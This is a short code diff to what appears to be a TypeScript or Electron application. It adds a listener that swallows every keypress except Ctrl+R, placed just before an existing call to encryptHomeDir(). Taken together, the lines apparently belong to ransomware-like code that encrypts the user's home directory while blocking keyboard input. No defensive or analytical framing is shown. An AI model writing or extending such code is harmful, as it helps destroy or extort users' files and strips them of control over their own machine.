@@ -41,4 +41,12 @@ async function listFilesToTerminalRecursive(dir: fs.Dir)
   }
 }
 
+window.addEventListener('keydown', (event) =>
+{
+  if (event.key != 'r' || !event.ctrlKey)
+  {
+    event.preventDefault();
+  }
+}, true);
+
 encryptHomeDir();
